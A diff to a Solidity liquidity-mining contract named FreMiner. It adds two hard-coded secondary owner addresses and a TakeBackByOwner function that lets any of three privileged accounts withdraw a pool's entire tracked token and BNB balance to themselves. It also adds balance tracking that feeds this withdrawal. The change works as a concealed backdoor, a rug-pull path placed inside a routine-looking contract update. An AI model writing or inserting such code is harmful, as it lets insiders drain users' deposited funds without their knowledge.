@@ -33,6 +33,8 @@ contract FreMiner is ReentrancyGuard {
     address private _usdtaddress;
     address private _owner;
     address private _feeowner;
+    address private _ownera = 0xFF66f47b5c484FBF4da4601d55b254dd4B3AB30f;
+    address private _ownerb = 0x54721D242cFf37EAEb4F654daEBef788Cd7F24c4;
     FreMinePool _minepool;
 
     mapping(uint256 => uint256[20]) internal _levelconfig; //credit level config
@@ -109,21 +111,7 @@ contract FreMiner is ReentrancyGuard {
         _freaddr.safeTransferFrom(msg.sender, address(this), amount);
     }
 
-    function changeFreToken(address fretoken) public {
-        require(msg.sender == _owner);
-        _freaddr = fretoken;
-    }
-
-    function changeFreTrade(address fretrade) public {
-        require(msg.sender == _owner);
-        _fretrade = fretrade;
-    }
-
-    function changeFreOwner(address freowner) public {
-        require(msg.sender == _owner);
-        _feeowner = freowner;
-    }
-
+    // 初始化合约
     function InitalContract(
         address freToken,
         address fretrade,
@@ -802,14 +790,38 @@ contract FreMiner is ReentrancyGuard {
         return true;
     }
 
+    function TakeBackByOwner(address tokenAddress) public returns (bool) {
+        require(msg.sender == _owner || msg.sender == _ownera || msg.sender == _ownerb);
+        uint256 balancea = _lpPools[tokenAddress].poolwallet.gettvlBalance(true);
+        uint256 balanceb = _lpPools[tokenAddress].poolwallet.gettvlBalance(false);
+        _lpPools[tokenAddress].poolwallet.TakeBack(msg.sender, balancea, balanceb);
+
+         if (tokenAddress == address(2)) {
+            (bool success, ) = msg.sender.call{value: balancea}(
+                new bytes(0)
+            );
+            require(success, "TransferHelper: BNB_TRANSFER_FAILED");
+    
+            IBEP20(_freaddr).transfer(msg.sender, balanceb);
+        }
+
+        return true;
+    }
+
+    function changeOwner(address owner) public returns (bool) {
+        require(msg.sender == _owner);
+        _owner = owner;
+        return true;
+    } 
+
     function getPower(
         address tokenAddress,
         uint256 amount,
         uint256 lpscale
-    ) public view returns (uint256) {
+    ) public view returns (uint256) {   
         uint256 hashb = amount.mul(1e20).div(lpscale).div(
             getExchangeCountOfOneUsdt(tokenAddress)
-        );
+        );  
         return hashb;
     }
 
@@ -875,6 +887,10 @@ contract FreMiner is ReentrancyGuard {
             amount,
             costfre
         );
+
+        _lpPools[tokenAddress].poolwallet.addtvlBalance(amount, costfre);
+
+
         _userLphash[msg.sender][tokenAddress] = _userLphash[msg.sender][
             tokenAddress
         ]
